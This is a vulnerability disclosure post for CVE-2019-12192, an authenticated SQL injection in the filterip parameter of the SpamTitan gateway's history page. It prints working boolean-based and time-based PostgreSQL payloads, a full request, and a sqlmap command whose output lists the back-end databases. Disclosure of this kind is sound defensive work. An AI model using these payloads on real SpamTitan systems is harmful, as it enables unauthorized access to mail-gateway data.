---
layout: post
title:  "SQL Injection in SpamTitan Gateway appliance"
date:   2019-05-05 19:51:02 +0700 
categories: [cve]
---

Vulnerability: SQL Injection

Vendor: TitanHQ is a trading name of Copperfasten Technologies, 

Product: SpamTitan

Version affected: SpamTitan v7.04, which was the latest available version as of 05/05/2019

#### Product description:

"SpamTitan is a full-service email security solution which protects your business, your employees and your clients.
The solution is extraordinarily simple to set up and manage and provides among its many features 99.97% spam detection,
virus and malware blocking, authentication control, outbound scanning as well as robust reporting structures.
Central to everything we do is our service commitment to our worldwide client base, start our free trial today and see why so many
global brands trust us with their business." as per statement on TitanHQ Spamtitan website. 

* CVE ID: CVE-2019-12192
* CWE ID: CWE-89

##### Proof of Concept

The authenticated SQL Injection vulnerability can be exploited by issuing a specially crafted HTTP GET request. SpamTitan v6 application fails to properly sanitize untrusted data before adding it to a SQL query. A malicious attacker can include own SQL commands which database will execute.

Identified vulnerable parameters: filterip  

{% highlight ruby %}
---
Parameter: filterip (GET)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: getHistory&sortdir=yui-dt-desc&sortkey=ts&startIndex=0&results=100&alltypes=1&historytype=C&setperiod=2&starttime=&endtime=&localonly=1&now=1556966449&filterflow=0&filterfrom=&filterto=&filterid=&filterscoretype=scoreany&filterscore=&filterdelivery=Any&filtersubject=&filterip=' AND (SELECT (CASE WHEN (8159=8159) THEN NULL ELSE CAST((CHR(87)||CHR(70)||CHR(105)||CHR(97)) AS NUMERIC) END)) IS NULL AND 'ZEZl'='ZEZl

    Type: AND/OR time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: getHistory&sortdir=yui-dt-desc&sortkey=ts&startIndex=0&results=100&alltypes=1&historytype=C&setperiod=2&starttime=&endtime=&localonly=1&now=1556966449&filterflow=0&filterfrom=&filterto=&filterid=&filterscoretype=scoreany&filterscore=&filterdelivery=Any&filtersubject=&filterip=' AND 6154=(SELECT 6154 FROM PG_SLEEP(5)) AND 'ahTq'='ahTq
---
{% endhighlight %}


#### Request:
{% highlight ruby %}
GET /history-x.php?getHistory&sortdir=yui-dt-desc&sortkey=ts&startIndex=0&results=100&alltypes=1&historytype=C&setperiod=2&starttime=&endtime=&localonly=1&now=1556966449&filterflow=0&filterfrom=&filterto=&filterid=&filterscoretype=scoreany&filterscore=&filterdelivery=Any&filtersubject=&filterip= HTTP/1.1
Host: 10.0.0.120
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: st-lastroletype=admin; st-domains=domain%3Ayui-dt-asc%3A15; st-trust=ip%3Ayui-dt-asc%3A15; st-smart=sender%3Ayui-dt-asc%3A15; st-whiteip=ip%3Ayui-dt-asc%3A15; st-blackip=ip%3Ayui-dt-asc%3A15; st-tls=domain%3Ayui-dt-asc%3A15; st-tld=tld%3Ayui-dt-asc%3A15; st-spf=ip%3Ayui-dt-asc%3A15; st-etrnblock=ip%3Ayui-dt-asc%3A15; st-etrnallow=ip%3Ayui-dt-asc%3A15; st-dkim=domain%3Ayui-dt-asc%3A15; st-greyip=ip%3Ayui-dt-asc%3A15; st-rbl=ip%3Ayui-dt-asc%3A15; st-greyname=name%3Ayui-dt-asc%3A15; st-greyrcpt=name%3Ayui-dt-asc%3A15; st-domainpolicies=domain%3Ayui-dt-asc%3A15; st-userpolicies=policy_name%3Ayui-dt-asc%3A15; st-realmadmins=email%3Ayui-dt-asc%3A15; st-admins=email%3Ayui-dt-asc%3A15; st-domainadmins=email%3Ayui-dt-asc%3A15; st-realms=name%3Ayui-dt-asc%3A15; PHPSESSID=77bf2e88fe78fe4db58e35f886be8fa4; st-authdomains=domain%3Ayui-dt-asc%3A5; st-disclaimers=domain%3AASC%3A25; st-disclaimers-exemptions=email%3AASC%3A25; wblist-email=email%3Ayui-dt-asc%3A25; wblist-domain=email%3Ayui-dt-asc%3A25; keywords-W=pattern%3Ayui-dt-asc%3A5; keywords-B=pattern%3Ayui-dt-asc%3A5; qset=bspam_level%3Ayui-dt-asc%3A3%3A150; HistoryRequestOpts=100%3A2; st-todaysreports=ts%3Ayui-dt-asc%3A25; st-scheduledreports=email%3Ayui-dt-asc%3A25; st-archivereports=ctime%3Ayui-dt-asc%3A25; st-alerts=name%3Ayui-dt-asc%3A10; st-roles=name%3Ayui-dt-asc%3A15; st-ratecontrols=10; locale=en_US; st-filter=name%3Ayui-dt-asc%3A10; HistoryDisplayOpts=Y%3AY%3AY%3AY%3AY%3AY%3AY%3AY%3AY%3AY; HistoryClusterOpts=Y%3AY
Upgrade-Insecure-Requests: 1
{% endhighlight %}

#### SQLmap tool (Automatic SQL injection and database takeover tool) used to retrieve available databases: 
{% highlight ruby %}
root@kali:~# sqlmap -r spamtitan-sql.txt --level=5 --risk=3 --dbms=postgres -p filterip --dbs
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2.5#pip}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] starting at 08:22:44

[08:22:44] [INFO] parsing HTTP request from 'spamtitan-sql.txt'
[08:22:44] [WARNING] provided value for parameter 'filterip' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[08:22:44] [INFO] testing connection to the target URL
[08:22:44] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: filterip (GET)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: getHistory&sortdir=yui-dt-desc&sortkey=ts&startIndex=0&results=100&alltypes=1&historytype=C&setperiod=2&starttime=&endtime=&localonly=1&now=1556966449&filterflow=0&filterfrom=&filterto=&filterid=&filterscoretype=scoreany&filterscore=&filterdelivery=Any&filtersubject=&filterip=' AND (SELECT (CASE WHEN (8159=8159) THEN NULL ELSE CAST((CHR(87)||CHR(70)||CHR(105)||CHR(97)) AS NUMERIC) END)) IS NULL AND 'ZEZl'='ZEZl

    Type: AND/OR time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: getHistory&sortdir=yui-dt-desc&sortkey=ts&startIndex=0&results=100&alltypes=1&historytype=C&setperiod=2&starttime=&endtime=&localonly=1&now=1556966449&filterflow=0&filterfrom=&filterto=&filterid=&filterscoretype=scoreany&filterscore=&filterdelivery=Any&filtersubject=&filterip=' AND 6154=(SELECT 6154 FROM PG_SLEEP(5)) AND 'ahTq'='ahTq
---
[08:22:44] [INFO] testing PostgreSQL
[08:22:44] [INFO] confirming PostgreSQL
[08:22:44] [INFO] the back-end DBMS is PostgreSQL
web application technology: Apache
back-end DBMS: PostgreSQL
[08:22:44] [WARNING] schema names are going to be used on PostgreSQL for enumeration as the counterpart to database names on other DBMSes
[08:22:44] [INFO] fetching database (schema) names
[08:22:44] [INFO] fetching number of databases
[08:22:44] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[08:22:44] [INFO] retrieved: 
you provided a HTTP Cookie header value. The target URL provided its own cookies within the HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y

[08:22:46] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)
[08:22:48] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[08:23:09] [INFO] adjusting time delay to 2 seconds due to good response times
3
[08:23:09] [INFO] retrieved: 
[08:23:09] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)
[08:23:18] [INFO] adjusting time delay to 1 second due to good response times
information_schema
[08:24:23] [INFO] retrieved: 
[08:24:23] [INFO] retrieved: pg_catalog
[08:25:04] [INFO] retrieved: 
[08:25:04] [INFO] retrieved: public
available databases [3]:
[*] information_schema
[*] pg_catalog
[*] public
{% endhighlight %}

#### References
1. https://www.owasp.org/index.php/SQL_Injection
2. https://www.titanhq.com/spamtitan
3. https://www.spamtitan.com/wp-content/uploads/2016/02/Titan_HQ_SpamTitan_Gateway_datasheet_.pdf
4. https://www.spamtitan.com/spamtitan-gateway-sign-up-confirmation/
